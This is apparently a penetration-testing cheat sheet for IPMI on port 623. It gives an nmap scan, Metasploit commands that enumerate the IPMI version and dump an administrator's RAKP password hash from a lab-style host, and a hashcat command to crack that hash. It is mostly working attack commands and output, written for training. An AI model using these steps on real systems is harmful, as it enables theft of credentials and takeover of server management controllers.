# IPMI

## Port

| NUMBER | DESCRIPTION |
|---|---|
| 623 | ASF Remote Management and Control Protocol (ASF-RMCP) & IPMI Remote Management Protocol |

## Nmap

```sh
my@attack:~$ sudo nmap 10.129.202.5 -p 623 -sU -Pn --script ipmi-version
```

## Metasploit Version Scan

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set RHOSTS 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

```output title="Output"
[*] Sending IPMI requests to 10.129.202.5->10.129.202.5 (1 hosts)
[+] 10.129.202.5:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Dumping Hashes

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

```output title="Output"
[+] 10.129.202.5:623 - IPMI - Hash found: admin:ee32a6d382000000a87fb0896bda6d5a00c6480ec1d473870678b957bd4b8c40fb89b383d2e6613da123456789abcdefa123456789abcdef140561646d696e:2ba1d0723f826c236fc903be4cb1e3390881c9b4
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Cracking the Hash

```sh
my@attack:~$ hashcat --hwmon-disable -a 0 -m 7300 ipmi.hash /usr/local/share/wordlists/rockyou.txt
```
